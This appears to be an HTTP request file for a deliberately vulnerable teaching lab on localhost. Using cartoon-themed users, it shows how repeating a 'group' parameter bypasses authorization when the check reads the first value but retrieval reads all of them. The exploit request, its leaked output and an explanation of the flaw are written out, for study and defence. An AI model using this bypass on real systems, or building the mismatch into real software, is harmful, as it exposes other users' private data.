@base = http://localhost:8000/ii/multi-value-semantics

### Expected usage: Mr. Krabs accesses multiple groups he administers
POST {{base}}/example2
Content-Type: application/x-www-form-urlencoded

user=mr.krabs@krusty-krab.sea&password=$$$money$$$&group=staff@krusty-krab.sea&group=managers@krusty-krab.sea

# Results in 200 OK - Mr. Krabs sees combined messages:
#
# [
#   {
#     "from": "mr.krabs@krusty-krab.sea",
#     "message": "I am updating the safe password to '123456'. Do not tell anyone!"
#   },
#   {
#     "from": "mr.krabs@krusty-krab.sea",
#     "message": "The secret formula is stored in the safe. Combination: rotate right 3 times to 12, left 2 times to 7, right once to 23."
#   }
# ]

###

### Plankton can access his own group's messages
POST {{base}}/example2
Content-Type: application/x-www-form-urlencoded

user=plankton@chum-bucket.sea&password=burgers-are-yummy&group=staff@chum-bucket.sea

# Results in 200 OK:
#
# [
#   {
#     "from": "plankton@chum-bucket.sea",
#     "message": "To my future self, don't forget to steal the formula!"
#   }
# ]

###

### EXPLOIT: Plankton accesses Krusty Krab messages by exploiting multi-value parameter handling
POST {{base}}/example2
Content-Type: application/x-www-form-urlencoded

user=plankton@chum-bucket.sea&password=burgers-are-yummy&group=staff@chum-bucket.sea&group=staff@krusty-krab.sea&group=managers@krusty-krab.sea

# Results in sensitive data disclosure:
#
# [
#   {
#     "from": "plankton@chum-bucket.sea",
#     "message": "To my future self, don't forget to steal the formula!"
#   },
#   {
#     "from": "mr.krabs@krusty-krab.sea",
#     "message": "I am updating the safe password to '123456'. Do not tell anyone!"
#   },
#   {
#     "from": "mr.krabs@krusty-krab.sea",
#     "message": "The secret formula is stored in the safe. Combination: rotate right 3 times to 12, left 2 times to 7, right once to 23."
#   }
# ]
#
# IMPACT: Plankton has stolen both the safe password AND the secret formula
# location and combination! The authorization check uses the FIRST group value
# (staff@chum-bucket.sea, which Plankton is authorized for), but the message
# retrieval uses ALL group values (including staff@krusty-krab.sea and
# managers@krusty-krab.sea). This first/all semantic mismatch allows attackers
# to pass authorization for their own resources while accessing victim resources.
